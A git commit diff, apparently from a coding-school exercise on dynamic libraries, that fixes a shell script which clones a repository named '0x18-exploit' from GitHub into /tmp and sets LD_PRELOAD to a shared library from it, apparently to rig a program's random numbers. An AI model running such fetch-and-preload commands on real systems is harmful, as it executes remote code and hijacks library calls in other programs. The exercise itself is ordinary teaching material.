cb66f7c3fa342b4bb9b66d9f7b71850cf47dfa5d
Joseph Alikah <alikahjoseph@gmail.com>
2022-10-04 17:28:31 +0100

    0x18 - Fix task 101

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-git clone curl https://github.com/Ehijoe/0x18-exploit/raw/main/librand.so /tmp/exploit
+git clone https://github.com/Ehijoe/0x18-exploit /tmp/exploit > /dev/null
 export LD_PRELOAD=/tmp/exploit/librand.so
